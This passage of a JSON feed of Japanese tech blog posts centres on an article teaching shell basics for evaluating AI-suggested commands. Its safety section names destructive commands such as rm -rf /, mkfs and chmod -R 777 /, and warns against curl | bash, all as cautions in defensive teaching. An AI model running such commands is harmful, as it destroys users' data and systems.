、それぞれに合った形で自分の知見を共有できれば、技術コミュニティ全体がより豊かになっていくのではないでしょうか。これらはあくまで個人の経験と観察に基づく意見であり、みなさんがそれぞれのスタイルや価値観で技術共有を行うことを応援しています。","isoDate":"2025-04-07T09:11:50.000Z","dateMiliSeconds":1744017110000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"運用中のDBに後付け Prisma Migrate を途中から導入する実践ガイド","link":"https://zenn.dev/meziron/articles/a95d3133a1c385","contentSnippet":"運用中のDBに後付け Prisma Migrate を途中から導入する実践ガイド（ハマりどころ解説付き） はじめに (きっかけ)「このプロジェクト、最初は Prisma 使ってたけど、マイグレーションまでは管理してなかったんだよな...」「開発も進んで、そろそろちゃんとスキーマ変更を管理したいけど、_prisma_migrations テーブルがない...」そんな状況、ありませんか？ 私もまさにその状況に直面しました。Prisma は導入済みでデータベーススキーマも存在しているけれど、Prisma Migrate によるマイグレーション管理は行われていない。運用が始まってい...","isoDate":"2025-04-07T05:34:46.000Z","dateMiliSeconds":1744004086000,"authorName":"Daichi Kugimiya","authorId":"kugimiya"},{"title":"CopilotChat.nvimでもギャルとペアプロしたい！","link":"https://blog.atusy.net/2025/04/06/copilotchat-with-gal/","contentSnippet":"ギャルとのペアプロが想像以上に楽しかった（VSCodeのカスタム指示）という話を見て、なにそれ面白いとなった。そこへ来て友人が、思慮深いお姉さんも登場させると勝手にプログラミングしてくれて面白いという。これはNeovimでもやってみるしかないと、とりあえずCopilotChat.nvimのユーザープロンプトを試してみた。しかし、見事にコンテンツフィルタに弾かれてしまいました。","isoDate":"2025-04-06T00:00:00.000Z","dateMiliSeconds":1743897600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"生成AI時代に必要なシェルの基本知識とシェル芸への入門","link":"https://syu-m-5151.hatenablog.com/entry/2025/04/04/085754","contentSnippet":"はじめに生成AIの急速な発展により、様々なAIアシスタントが日常的にシェルコマンドを提案してくれるようになりました。また、最新のAI統合ツールは、ユーザーの自然言語指示からコマンドを生成し、場合によっては自動的に実行することさえあります。このような環境では、AIが提案または実行するシェルコマンドを正確に理解し、安全に活用するための知識が不可欠となっています。「コマンドプロンプトやLinuxなんて難しそう」「プログラミングは専門家の領域」と思っている方こそ、この記事をお読みください。AIツールを使う現代では、専門知識がなくても基本を知っておくことで安全性が大きく変わります。本記事では、生成AIが提案するシェルコマンドを適切に評価し、安全に活用するために必要なシェルの基本知識と「シェル芸」と呼ばれる技術について詳しく解説します。難しい専門用語は極力避け、初心者の方でも理解できるよう丁寧に説明していきます。AIが生成したコードを盲目的に実行することのリスクを避けつつ、その強力な機能を最大限に活用するための実践的な知識を身につけていただくことを目指しています。b.ueda.tech普通に無料でダウンロードできるのでLinux標準教科書もオススメです。linuc.orgこのブログが良ければ読者になったり、nwiizoをフォロワーしてくれると嬉しいです。では、早速はじめていきます。はじめに生成AIとシェルコマンドの関係シェルの基本概念代表的なシェルシェルの重要な機能1. I/O（入出力）2. パイプ3. リダイレクト4. フィルタ処理5. 内部展開6. 制御構文条件分岐（if文）case文（パターンマッチング）for ループwhile ループuntil ループ（条件が真になるまで繰り返す）関数定義と呼び出しその他の制御構文と技法AIが提案するシェルコマンドを理解するAIが生成するシェルコマンドの特徴ワンライナーの理解と解読ワンライナーの特徴生成AIが提案するワンライナーの例ワンライナーを解読する方法ワンライナーを複数行スクリプトに変換するコマンドを分解して理解する方法危険なコマンドの見分け方注意すべきコマンドとオプション安全に検証する方法安全な実行環境の構築と活用実用的なシェル芸とAIの活用例ファイル処理系のシェル芸とAIの活用AIが提案する大量ファイル処理の評価と調整AIからの提案を検証して実行する例テキスト処理系のシェル芸とAIの連携AIが提案するログ解析コマンドの評価AIと連携したデータ前処理の例環境変数とエイリアスの理解環境変数の確認と活用AIが提案するエイリアスを安全に設定ジョブ制御と長時間実行コマンド長時間実行コマンドの制御実行中コマンドの管理ワンライナーの安全性評価と活用法ワンライナーの安全性評価チェックリストワンライナーを安全に変換する方法AIが提案するワンライナーを効果的に活用するコツワンライナー活用のベストプラクティスまとめ生成AIとシェルコマンドの関係生成AIはシェルコマンドの提案において非常に優れた能力を持っています。複雑な操作を1行のコマンドで実現したり、複数のツールを組み合わせて効率的なデータ処理を行ったりするシェルコマンドを即座に提案できます。しかし、この便利さの一方で、次のような課題も生じています。理解なき実行のリスク: AIが提案するコマンドを理解せずに実行すると、意図しないファイル削除やセキュリティリスクを引き起こす可能性があります環境依存の問題: AIは特定の環境を前提としたコマンドを提案することがあり、異なる環境で実行すると期待した結果が得られないことがあります権限の問題: 管理者権限が必要なコマンドを適切な検証なしに実行すると、システムに重大な影響を及ぼす可能性があります自動実行の危険性: GitHub Copilot CLIなどのツールがコマンドを自動生成し実行する場合、確認の機会なくリスクのあるコマンドが実行される可能性がありますこれらの課題に対処するには、シェルの基本を理解し、AIが提案するコマンドを正確に評価できる能力が必要です。シェルの基本概念シェルとは、オペレーティングシステム（OS）のカーネルと対話するためのインターフェースです。ユーザーがコマンドを入力すると、シェルはそれを解釈し、OSに対して適切な指示を出します。豆知識: シェルという名前は「殻」を意味し、OSの核心部分（カーネル）を覆う層として機能することに由来しています。［試して理解］Linuxのしくみ　―実験と図解で学ぶOS、仮想マシン、コンテナの基礎知識【増補改訂版】作者:武内 覚技術評論社Amazon代表的なシェルBash (Bourne Again SHell): Linux/Unixの標準シェルZsh (Z Shell): Bashの機能を拡張したシェル、macOSのデフォルトシェルPowerShell: Windowsで使用されるシェルFish: ユーザーフレンドリーな機能を持つシェル生成AIは異なるシェル環境向けのコマンドを提案することがあるため、自分の環境に合ったコマンドを理解し選択する必要があります。シェルの重要な機能AIが提案するコマンドを理解するには、以下のシェルの基本機能を把握することが重要です。1. I/O（入出力）Linuxの入出力は主に3つのストリームで管理されています。標準入力（stdin）: ユーザーからのキーボード入力（ファイルディスクリプタ 0）標準出力（stdout）: 通常の出力結果（ファイルディスクリプタ 1）標準エラー出力（stderr）: エラーメッセージ（ファイルディスクリプタ 2）AIが複雑な入出力リダイレクトを含むコマンドを提案した場合、これらの概念を理解していないと意図しない動作を引き起こす可能性があります。2. パイプパイプ（|記号）を使うと、あるコマンドの出力を次のコマンドの入力として渡すことができます。AIは複数のコマンドをパイプでつないだ複雑なワンライナーを好んで提案することがあります。例：# AIが提案するような複雑なパイプラインfind . -type f -name \\"*.log\\" | grep \\"ERROR\\" | awk \'{print $1, $2}\' | sort | uniq -cこのようなコマンドを理解するには、各部分の役割を個別に把握する必要があります。3. リダイレクトシェルではコマンドの出力を任意のファイルに書き出したり、コマンドへの入力を任意のファイルから行ったりできます。例：# 出力のリダイレクトls -l > file_list.txt  # 上書きls -l >> file_list.txt  # 追記# 入力のリダイレクトsort < unsorted.txt# エラー出力のリダイレクトcommand 2> error.log# 標準出力とエラー出力を同じファイルへcommand > output.log 2>&1AIが提案するコマンドにリダイレクトが含まれる場合、既存ファイルの上書きなど、意図しない結果につながる可能性があるため注意が必要です。4. フィルタ処理生成AIは多くの場合、複数のフィルタコマンドを組み合わせた処理を提案します。代表的なフィルタコマンドとその役割を理解しておくことが重要です。grep: テキスト検索（正規表現可）sed: ストリームエディタ（テキスト置換など）awk: テキスト処理言語（列指向の処理に強い）sort/uniq: 行のソートと重複排除cut/paste: 列の切り出しと結合head/tail: 先頭/末尾の行を表示AIが提案する複雑なパイプラインは、これらのコマンドを組み合わせたものであることが多いため、各コマンドの役割を理解していれば全体の意図も把握しやすくなります。5. 内部展開シェルは入力されたコマンドを実行する前に、様々な展開処理を行います。AIが提案するコマンドに含まれる特殊な構文を理解するには、これらの展開処理の知識が必要です。変数展開: $VAR や ${VAR} で変数の値に置き換えるコマンド置換: `command` や $(command) でコマンドの実行結果に置き換える算術展開: $((expression)) で数式の計算結果に置き換えるブレース展開: {a,b,c} や {1..5} でパターンを展開するパス名展開（グロビング）: *, ?, [abc] などのワイルドカードを使ったファイル名の展開AIが提案するコマンドには、これらの展開を利用した簡潔な表現が含まれていることが多いです。6. 制御構文シェルスクリプト内での処理の流れを制御するための構文です。AIはしばしば複雑な条件分岐やループを含むシェルスクリプトを提案します。これらの構文を理解できないと、AIが提案するスクリプトの意図や潜在的なリスクを見逃す可能性があります。条件分岐（if文）# 基本構文if [ 条件 ]; then    # 条件が真の場合の処理elif [ 別の条件 ]; then    # 別の条件が真の場合の処理else    # どの条件も満たさない場合の処理fi# 数値比較の例if [ $num -eq 10 ]; then    echo \\"numは10です\\"elif [ $num -gt 10 ]; then    echo \\"numは10より大きいです\\"else    echo \\"numは10より小さいです\\"fi# ファイル・ディレクトリのテストif [ -f \\"$file\\" ]; then    echo \\"$fileは通常ファイルです\\"elif [ -d \\"$file\\" ]; then    echo \\"$fileはディレクトリです\\"elif [ ! -e \\"$file\\" ]; then    echo \\"$fileは存在しません\\"fi# 文字列比較if [ \\"$str1\\" = \\"$str2\\" ]; then    echo \\"二つの文字列は同じです\\"fiif [ -z \\"$var\\" ]; then    echo \\"変数は空です\\"fi主な条件テスト演算子：- 数値比較: -eq(等しい), -ne(等しくない), -lt(より小さい), -le(以下), -gt(より大きい), -ge(以上)- ファイルテスト: -e(存在する), -f(通常ファイル), -d(ディレクトリ), -r(読み取り可能), -w(書き込み可能), -x(実行可能)- 文字列テスト: =(等しい), !=(等しくない), -z(空), -n(非空)高度な条件テスト（[[ ]]構文）：# 拡張条件テストif [[ \\"$file\\" == *.txt ]]; then    echo \\"テキストファイルです\\"fiif [[ \\"$str\\" =~ ^[0-9]+$ ]]; then    echo \\"数値のみの文字列です\\"fi# 論理演算子if [[ $num -gt 5 && $num -lt 10 ]]; then    echo \\"numは5より大きく10未満です\\"fiif [[ $opt == \\"a\\" || $opt == \\"b\\" ]]; then    echo \\"オプションはaまたはbです\\"ficase文（パターンマッチング）# 基本構文case $variable in    pattern1)        # pattern1にマッチした場合の処理        ;;    pattern2|pattern3)        # pattern2またはpattern3にマッチした場合の処理        ;;    *)        # どのパターンにもマッチしない場合の処理（デフォルト）        ;;esac# 実用例case $action in    start|begin)        echo \\"サービスを開始します\\"        service_start        ;;    stop|end)        echo \\"サービスを停止します\\"        service_stop        ;;    restart)        echo \\"サービスを再起動します\\"        service_restart        ;;    *)        echo \\"使用法: $0 {start|stop|restart}\\"        exit 1        ;;esacfor ループ# 基本形（リスト指定）for item in item1 item2 item3; do    echo \\"処理: $item\\"done# 範囲指定for i in {1..10}; do    echo \\"数: $i\\"done# ステップ付き範囲指定for i in {1..10..2}; do    echo \\"奇数: $i\\"  # 1,3,5,7,9done# コマンド出力をループfor file in $(find . -name \\"*.txt\\"); do    echo \\"ファイル: $file\\"done# ワイルドカード展開for file in *.log; do    echo \\"ログファイル: $file\\"done# C言語風の構文for ((i=0; i<5; i++)); do    echo \\"カウント: $i\\"donewhile ループ# 基本構文while [ 条件 ]; do    # 条件が真の間、繰り返し実行される処理done# カウンタ変数による繰り返しcount=1while [ $count -le 5 ]; do    echo \\"カウント: $count\\"    count=$((count + 1))done# ファイル内容を1行ずつ処理while read line; do    echo \\"Line: $line\\"done < input.txt# コマンド結果をチェックするループwhile ping -c 1 example.com > /dev/null; do    echo \\"サーバーは応答しています\\"    sleep 5doneuntil ループ（条件が真になるまで繰り返す）# 基本構文until [ 条件 ]; do    # 条件が偽の間、繰り返し実行される処理done# 例: サービスが起動するまで待機until service_is_running; do    echo \\"サービス起動を待機中...\\"    sleep 2doneecho \\"サービスが起動しました\\"関数定義と呼び出し# 基本的な関数定義function greet {    echo \\"Hello, World!\\"}# 別の構文（function キーワードなし）backup_file() {    cp \\"$1\\" \\"$1.bak\\"    echo \\"Backed up $1 to $1.bak\\"}# 引数を受け取る関数print_args() {    echo \\"第1引数: $1\\"    echo \\"第2引数: $2\\"    echo \\"すべての引数: $@\\"    echo \\"引数の数: $#\\"}# 戻り値を返す関数is_even() {    if (( $1 % 2 == 0 )); then        return 0  # 成功（真）    else        return 1  # 失敗（偽）    fi}# 関数の呼び出しgreetbackup_file \\"important.txt\\"print_args \\"hello\\" \\"world\\"# 戻り値のチェックif is_even 4; then    echo \\"4は偶数です\\"fiその他の制御構文と技法# コマンドの成功/失敗に基づく条件実行command1 && command2  # command1が成功した場合のみcommand2を実行command1 || command2  # command1が失敗した場合のみcommand2を実行# 例grep \\"pattern\\" file.txt && echo \\"パターンが見つかりました\\"grep \\"pattern\\" file.txt || echo \\"パターンが見つかりませんでした\\"# サブシェル（グループ化）(cd /tmp && ls -la)  # 現在のディレクトリを変更せずにコマンドを実行# 現在のシェルでのグループ化{ echo \\"開始\\"; command1; command2; echo \\"終了\\"; }# エラーハンドリングset -e  # エラーが発生したらスクリプトを終了trap \'echo \\"エラーが発生しました\\"; exit 1\' ERR  # エラー発生時の処理を指定# デバッグモードset -x  # 実行されるコマンドを表示AIが生成するシェルスクリプトには、これらの制御構文が組み合わされて使用されることが多いです。特に注意すべき点は：条件判定の確認: 条件テストが意図したとおりに動作するか確認するループの終了条件: 無限ループになっていないか確認するエラーハンドリング: エラー発生時に適切に処理されるか確認する変数の展開: 変数が適切に展開されて使用されているか確認するAIが提案するスクリプトの制御構文を理解することで、そのスクリプトが何をしようとしているのか、そして潜在的なリスクがあるかどうかを判断できるようになります。AIが提案するシェルコマンドを理解する生成AIは非常に効率的なシェルコマンドを提案できますが、それを理解し安全に実行するにはいくつかのステップが必要です。特に生成AIは複雑な処理を1行で完結させる「ワンライナー」を好んで提案する傾向があります。1日1問、半年以内に習得　シェル・ワンライナー160本ノック Software Design plus作者:上田 隆一,山田 泰宏,田代 勝也,中村 壮一,今泉 光之,上杉 尚史技術評論社AmazonAIが生成するシェルコマンドの特徴複雑なワンライナー: 複数の処理を1行で実行するコマンド高度なオプションの使用: 一般的ではない特殊なオプションの利用複数のツールの組み合わせ: grep, sed, awk, findなど複数のツールを組み合わせた処理正規表現の多用: 複雑なパターンマッチングを使用したテキスト処理環境依存の記述: 特定の環境を前提としたコマンドリソース集約的な処理: システムリソースを大量に消費する可能性のある処理ワンライナーの理解と解読生成AIは複数のコマンドを組み合わせた「ワンライナー」を頻繁に提案します。ワンライナーとは、複数の処理を1行のコマンドで完結させる技法で、効率的ですが理解が難しい場合があります。ワンライナーの特徴複数コマンドの連結: パイプ（|）やセミコロン（;）で複数のコマンドを連結制御構文の圧縮: if文やループをセミコロンで区切り1行に記述サブシェルの多用: $(command) や `command` でコマンド出力を埋め込みリダイレクトの組み合わせ: 入出力リダイレクトを複雑に組み合わせる特殊な演算子: &&（AND）、||（OR）、{}（グループ化）などの使用生成AIが提案するワンライナーの例# ログファイルからエラーを抽出して集計するワンライナーfind /var/log -name \\"*.log\\" -mtime -7 | xargs grep -l \\"ERROR\\" | xargs cat | grep -o \\"ERROR: [^ ]*\\" | sort | uniq -c | sort -nr | head -10# ディレクトリ内の大きなファイルを検索して移動するワンライナーfind . -type f -size +100M -exec du -h {} \\\\; | sort -hr | head -10 | awk \'{print $2}\' | xargs -I{} mv {} /backups/# 複数ファイルの文字列を一括置換するワンライナーgrep -l \\"oldtext\\" *.txt | xargs sed -i \'s/oldtext/newtext/g\'# 条件分岐を含むワンライナーfor file in *.log; do [ -s \\"$file\\" ] && echo \\"$file is not empty\\" || echo \\"$file is empty\\"; done# サブシェルと変数展開を使ったワンライナーfor i in {1..5}; do mkdir -p project_$(date +%Y%m%d)_$i/{src,docs,tests}; doneワンライナーを解読する方法セミコロンで分割: セミコロン（;）で区切られた部分を別々のコマンドとして考える   # 元のワンライナー   cd /tmp; mkdir test; cd test; touch file.txt; echo \\"done\\"      # 分解したコマンド   cd /tmp   mkdir test   cd test   touch file.txt   echo \\"done\\"パイプライン分析: パイプ（|）ごとにデータの流れを追跡する   # パイプラインの追跡   find . -name \\"*.log\\" | grep \\"ERROR\\" | awk \'{print $1}\' | sort | uniq -c      # ステップ1: logファイルの一覧を生成   # ステップ2: ERRORを含む行をフィルタリング   # ステップ3: 各行の最初のフィールドを抽出   # ステップ4: 結果をソート   # ステップ5: 重複を数えて集計制御構造の識別: for、if、whileなどの制御構造を識別して展開する   # 元のワンライナー   for file in *.txt; do grep \\"pattern\\" \\"$file\\" && echo \\"$file contains pattern\\"; done      # 展開した形   for file in *.txt   do       if grep \\"pattern\\" \\"$file\\"       then           echo \\"$file contains pattern\\"       fi   doneエコーデバッグ: 実行せずに echo でコマンドを表示する   # 危険そうなワンライナー   find . -name \\"*.tmp\\" -delete      # エコーデバッグバージョン   find . -name \\"*.tmp\\" -print部分実行: ワンライナーの一部だけを実行して結果を確認   # 完全なワンライナー   find . -name \\"*.log\\" | xargs grep \\"ERROR\\" | awk \'{print $1,$2}\' | sort > errors.txt      # 部分実行   find . -name \\"*.log\\" | head  # まず対象ファイルを確認   find . -name \\"*.log\\" | xargs grep \\"ERROR\\" | head  # エラー行を確認ワンライナーを複数行スクリプトに変換するAIが提案する複雑なワンライナーは、理解しやすい複数行スクリプトに変換すると安全性が向上します。# 元のワンライナーfind /var/log -name \\"*.log\\" -mtime -7 | xargs grep -l \\"ERROR\\" | xargs cat | grep -o \\"ERROR: [^ ]*\\" | sort | uniq -c | sort -nr | head -10# 複数行スクリプトに変換#!/bin/bash# 最近7日間のログファイルを見つけるlog_files=$(find /var/log -name \\"*.log\\" -mtime -7)# エラーを含むファイルだけを抽出error_files=$(grep -l \\"ERROR\\" $log_files)# エラーメッセージを抽出して集計cat $error_files |     grep -o \\"ERROR: [^ ]*\\" |     sort |     uniq -c |     sort -nr |     head -10コマンドを分解して理解する方法AIが提案する複雑なコマンドを理解するための効果的なアプローチ：パイプでセグメント化: パイプ（|）ごとにコマンドを分割して考える   # 元のコマンド   find . -name \\"*.log\\" | grep \\"ERROR\\" | awk \'{print $1}\' | sort | uniq -c      # 分解して考える   find . -name \\"*.log\\"     # ステップ1: logファイルを見つける   grep \\"ERROR\\"             # ステップ2: ERRORを含む行を抽出   awk \'{print $1}\'         # ステップ3: 各行の最初のフィールドを取得   sort                     # ステップ4: 結果をソート   uniq -c                  # ステップ5: 重複をカウント部分的な実行: コマンドの一部だけを実行して結果を確認   # 段階的に実行して結果を確認   find . -name \\"*.log\\" | head  # まず対象ファイルを確認   find . -name \\"*.log\\" | grep \\"ERROR\\" | head  # 次にエラー行を確認マニュアルの確認: 不明なオプションは man や --help で調査   man find   # findコマンドのマニュアルを表示   grep --help  # grepのヘルプを表示テスト環境での実行: 実際のシステムやデータに影響を与えないテスト環境で試す危険なコマンドの見分け方AIが提案するコマンドの中には、システムに重大な影響を与える可能性のあるものもあります。そのようなコマンドを見分けるポイント：注意すべきコマンドとオプションファイル削除系   rm -rf  # 再帰的強制削除（特に /* や / を含む場合は危険）   find ... -delete  # 見つかったファイルを削除ファイル書き換え系   > file  # ファイルの内容を上書き   sed -i  # ファイルを直接編集   dd      # ブロックレベルでのデータコピー（特にofオプションが危険）システム関連   shutdown, reboot  # システムの停止や再起動   chmod -R 777 /  # 危険な権限変更   mkfs  # ファイルシステムのフォーマットネットワーク関連   iptables -F  # ファイアウォールルールの削除   ssh-keygen -R  # 既知のホスト情報の削除安全に検証する方法実行前の確認コマンドの各部分が何をするのか理解する特に -f, -r, --force などの強制オプションに注意ワイルドカード (*, ?) の展開範囲を確認安全なオプションの利用   # 本当に削除する前に確認   rm -i file  # 対話的に確認      # 実際の変更前にシミュレーション   find . -name \\"*.tmp\\" -print  # -deleteの代わりに-printで確認   rsync --dry-run src/ dest/  # 実際のコピーなしでシミュレーションエコーやリダイレクト先の変更   # 危険なコマンドの代わりに同等の安全なコマンドで確認   echo \\"rm -rf /\\" # 実行せずに表示      # リダイレクト先を変更   command > /tmp/test.out  # 重要なファイルではなくテスト用ファイルに出力実行前のバックアップ   # 重要なファイルのバックアップ   cp -a important_file important_file.bak安全な実行環境の構築と活用これらのコマンドの違いが分からない場合は、システム環境を破壊してしまう可能性があるため、VM（仮想マシン）やDocker（コンテナ技術）、リモートホストなどの隔離環境を使用しましょう。生成AIが提案するシェルコマンドを実行する際には、潜在的なリスクを軽減するために隔離された安全な環境を利用することが推奨されます。特に未知のコマンドや複雑なワンライナー（1行で記述された複合コマンド）を試す場合は、これらの環境を活用することでメインシステムへの悪影響を最小限に抑えることができます。実用的なシェル芸とAIの活用例AIが提案するシェルコマンドを理解し、自分のニーズに合わせて調整することで、日常の作業を効率化できます。ファイル処理系のシェル芸とAIの活用AIが提案する大量ファイル処理の評価と調整# AIが提案した複雑なファイル名変更コマンドfind . -type f -name \\"log_*.txt\\" -exec bash -c \'mv \\"$1\\" \\"${1/log_/archive_}\\"\' _ {} \\\\;# より理解しやすく調整したバージョン# まず対象を確認find . -type f -name \\"log_*.txt\\" -print# 安全に実行for file in log_*.txt; do  echo \\"Renaming $file to ${file/log_/archive_}\\"  mv \\"$file\\" \\"${file/log_/archive_}\\"doneAIからの提案を検証して実行する例# AI提案: ディレクトリ内の全HTMLファイルでテキスト置換find . -type f -name \\"*.html\\" -exec sed -i \'s/oldCompany/newCompany/g\' {} \\\\;# 検証方法# 1. まず対象ファイルを確認find . -type f -name \\"*.html\\" | wc -l  # 対象ファイル数の確認# 2. 一部のファイルで試すfind . -type f -name \\"*.html\\" | head -1 | xargs grep \\"oldCompany\\"  # 置換前の確認find . -type f -name \\"*.html\\" | head -1 | xargs sed \'s/oldCompany/newCompany/g\'  # 置換シミュレーション# 3. バックアップしてから実行find . -type f -name \\"*.html\\" -exec cp {} {}.bak \\\\;  # バックアップ作成find . -type f -name \\"*.html\\" -exec sed -i \'s/oldCompany/newCompany/g\' {} \\\\;  # 実行テキスト処理系のシェル芸とAIの連携AIが提案するログ解析コマンドの評価# AI提案: 複雑なログ解析コマンドcat access.log | grep -o \'\\"GET [^\\"]*\\"\' | sed \'s/\\"GET \\\\(.*\\\\)\\"/\\\\1/g\' | sort | uniq -c | sort -nr | head -10# 検証と理解# 1. 段階的に実行cat access.log | head -5  # まずログの形式を確認cat access.log | grep -o \'\\"GET [^\\"]*\\"\' | head -5  # GETリクエストの抽出確認cat access.log | grep -o \'\\"GET [^\\"]*\\"\' | sed \'s/\\"GET \\\\(.*\\\\)\\"/\\\\1/g\' | head -5  # パスの抽出確認# 2. 最終結果の解釈# このコマンドは「アクセス数の多いパスTOP10」を表示しているAIと連携したデータ前処理の例# AIにデータを渡す前の前処理# 1. 個人情報をマスクcat data.csv | sed \'s/\\\\([0-9]\\\\{3\\\\}\\\\)[0-9]\\\\{4\\\\}\\\\([0-9]\\\\{4\\\\}\\\\)/\\\\1-XXXX-\\\\2/g\' > masked_data.csv# 2. 必要な列だけを抽出cat masked_data.csv | awk -F, \'{print $1,$3,$5}\' OFS=, > processed_data.csv# 3. AIに送るデータのサンプルを確認head -10 processed_data.csv環境変数とエイリアスの理解AIが提案するコマンドには、環境変数やエイリアスを利用したものもあります。これらを正しく理解することで、コマンドの意図や潜在的な問題を把握できます。環境変数の確認と活用# AIが提案する環境変数を使ったコマンドcd $HOME/projects && find . -name \\"*.py\\" | xargs grep \\"TODO\\"# 検証方法echo $HOME  # HOME変数の値を確認ls -la $HOME/projects  # プロジェクトディレクトリの存在確認AIが提案するエイリアスを安全に設定# AI提案: 便利なエイリアスalias ll=\'ls -la\'alias findgrep=\'find . -type f -exec grep --color=auto -l \\"$1\\" {} \\\\;\'# 検証と調整# 関数として定義し直す（引数の扱いが明確）findgrep() {  find . -type f -exec grep --color=auto -l \\"$1\\" {} \\\\;}# 使い方の確認type findgrep  # 関数定義を確認findgrep \\"search term\\"  # 実行テストジョブ制御と長時間実行コマンドAIはしばしば長時間実行する可能性のあるコマンドを提案します。このようなコマンドを実行する際のジョブ制御を理解しておくことが重要です。長時間実行コマンドの制御# AI提案: 大量ファイルの圧縮find /var/log -type f -name \\"*.log\\" | xargs gzip# より安全な実行方法# バックグラウンド実行してログを残すfind /var/log -type f -name \\"*.log\\" | xargs gzip > compression.log 2>&1 &echo $! > compression.pid  # プロセスIDを保存# 実行状況の確認ps -p $(cat compression.pid)tail -f compression.log実行中コマンドの管理# 実行中のコマンドの一時停止と再開Ctrl+Z  # 一時停止bg      # バックグラウンドで再開fg      # フォアグラウンドで再開# ジョブの一覧と管理jobs    # 現在のジョブ一覧kill %1  # ジョブ番号1を終了# ログアウト後も実行を継続nohup command &  # ログアウト後も実行継続screen           # 仮想端末での実行tmux             # ターミナルマルチプレクサでの実行ワンライナーの安全性評価と活用法生成AIが提案するワンライナーを安全に活用するためのポイントです。ワンライナーの安全性評価チェックリストワンライナーを実行する前に以下の点をチェックすると安全性が向上します。また、これらが通っているからといって必ず安全というわけではない。破壊的コマンドの有無rm, mv, dd, > (上書きリダイレクト)などのデータを破壊する可能性のあるコマンドが含まれているか例: rm -rf, find ... -delete, sed -i などは特に注意システム全体への影響/, /etc, /bin などの重要なシステムディレクトリに対する操作があるかchmod -R, chown -R などの再帰的な権限変更が含まれているかリソース消費find / など広範囲を検索する処理が含まれているか深い再帰処理や大量のファイル処理による負荷の可能性はあるか特権要求sudo や su などの特権昇格が含まれているか実行に特別な権限が必要なコマンドが含まれているかバックドア・不審なコードcurl | bash のようなインターネットからのスクリプト実行が含まれていないか暗号化されたコードや理解できない難読化された部分が含まれていないかワンライナーを安全に変換する方法# 危険なワンライナーfind / -name \\"*.bak\\" -delete# より安全な代替案# 1. プレビューモード: 削除せずに表示のみfind / -name \\"*.bak\\" -print# 2. 対話モード: 一つずつ確認find / -name \\"*.bak\\" -exec rm -i {} \\\\;# 3. 特定ディレクトリに限定find ~/projects -name \\"*.bak\\" -delete# 4. スクリプトに変換して段階的に実行#!/bin/bashecho \\"次のファイルを削除します:\\"find / -name \\"*.bak\\" -printread -p \\"続行しますか？ (y/n) \\" answerif [ \\"$answer\\" = \\"y\\" ]; then    find / -name \\"*.bak\\" -deletefiAIが提案するワンライナーを効果的に活用するコツ理解してから実行: 必ず各部分の意味を理解してから実行する段階的な検証: まず無害なオプションで実行し、結果を確認してから本来の処理を実行コメント付きスクリプトへの変換: 複雑なワンライナーはコメント付きの複数行スクリプトに変換変数の活用: ハードコードされたパスや値を変数に置き換えて柔軟性を高める環境に合わせた調整: 自分の環境に合わせてコマンドを調整するワンライナー活用のベストプラクティススクリプト化して再利用: 有用なワンライナーはスクリプトファイルに保存して再利用エイリアスとして登録: 頻繁に使うワンライナーはエイリアスとして登録   alias finderrors=\'find . -name \\"*.log\\" | xargs grep -l \\"ERROR\\"\'関数化: 引数を受け取れるようにしてカスタマイズ性を高める   find_errors() {       find . -name \\"*.$1\\" | xargs grep -l \\"$2\\"   }   # 使用例: find_errors log ERRORバージョン管理: 重要なワンライナーやスクリプトはGitなどで管理ドキュメント化: 複雑なワンライナーは使い方や前提条件をドキュメント化まとめ生成AIがシェルコマンドを提案する時代において、以下のポイントを押さえておくことが重要です。理解してから実行: AIが提案するコマンドを盲目的に実行せず、各部分の意味を理解してから実行する段階的な検証: 複雑なコマンドは部分的に実行して、期待通りの動作をするか確認する危険なコマンドの見極め: システムに重大な影響を与える可能性のあるコマンドを識別できるようにする適切な調整: AIの提案を自分の環境や要件に合わせて調整する能力を身につけるバックアップの習慣: 重要なデータは常にバックアップしてから操作するワンライナーの分解理解: 複雑なワンライナーは各部分に分解して理解するスクリプト化の検討: 複雑なコマンドはスクリプトに変換して読みやすく、再利用可能にするこれらの知識とアプローチを身につけることで、生成AIが提案するシェルコマンドを安全かつ効果的に活用し、作業効率を大幅に向上させることができます。AI時代のシェルコマンド活用は、理解に基づいた適切な判断が鍵となります。生成AIとシェルの組み合わせは非常に強力なツールですが、その力を適切に扱うには基本的な理解が欠かせません。この記事が、皆さんがAIと安全に協働するための一助となれば幸いです。入門 モダンLinux ―オンプレミスからクラウドまで、幅広い知識を会得する作者:Michael Hausenblasオーム社Amazonより詳しく知りたい人はLinuxシステムプログラミング作者:Robert Love,ロバート ラブオライリージャパンAmazon狂人はこちらでお願いします。Linuxプログラミングインタフェース作者:Michael KerriskオライリージャパンAmazon","isoDate":"2025-04-03T23:57:54.000Z","dateMiliSeconds":1743724674000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"【スリーシェイク】入社エントリ\uD83E\uDD73 \uD83C\uDF89","link":"https://zenn.dev/meziron/articles/9d727354b70ecd","contentSnippet":"こんにちは！こんばんは！スリーシェイクにフルスタックエンジニアとして入社して2ヶ月が経ちました、あびまる（釘宮）です。この2ヶ月間、スリーシェイクのカルチャー、メンバーの意識の高さ、そして温かい雰囲気に触れ、非常に充実した日々を送っています。今回は、私が実際に体験したスリーシェイクの魅力について、すこしだけ語らせてください！\uD83D\uDE47 会社のカルチャーへの感動まず、会社のカルチャーに深く感銘を受けました。CEO自らが技術発信の重要性を説き、社会のtoil（無駄な作業）をなくすために全力を尽くす姿勢は、非常に刺激的です。✨また、社長との定期的なミーティングでは、プロダクトやサービスの新機...","isoDate":"2025-04-03T14:01:57.000Z","dateMiliSeconds":1743688917000,"authorName":"Daichi Kugimiya","authorId":"kugimiya"},{"title":"GTC2025 参加記録　~Keynote~","link":"https://sreake.com/blog/gtc2025-keynote/","contentSnippet":"3-shakeのsreake事業部でフルスタックエンジニアとして、主にML周りを担当している赤川です。今回は、サンフランシスコのサンノゼで3/17~3/21に開催されたGTC2025において、NVIDIA CEOのJen […]The post GTC2025 参加記録　~Keynote~ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-03-31T00:26:08.000Z","dateMiliSeconds":1743380768000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Keyball 61にhome row modsを導入した","link":"https://blog.atusy.net/2025/03/31/home-row-mods/","contentSnippet":"長らくキー配列についてはKeyball61のオレオレマッピングを語るの通りでしたが、加えてhome row modsを導入しました。home row 